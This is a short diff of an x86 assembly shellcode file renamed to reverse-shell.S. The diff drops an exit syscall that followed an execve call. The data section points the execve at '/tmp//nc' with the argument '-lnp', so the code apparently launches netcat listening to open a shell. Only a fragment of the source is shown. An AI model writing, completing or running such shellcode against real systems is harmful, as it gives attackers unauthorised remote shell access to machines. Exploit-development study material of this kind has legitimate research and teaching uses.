@@ -1,4 +1,4 @@
-; reverse-shell-32.S:
+; reverse-shell.S:
 global _start
 
   section .text
@@ -10,10 +10,6 @@ global _start
 	  mov eax, 11
 	  int 0x80
 
-  	mov eax, 1
-	  xor ebx, ebx
-	  int 0x80
-    
   section .rodata
   filename: db "/tmp//nc", 0
   arg1: db "-lnp", 0
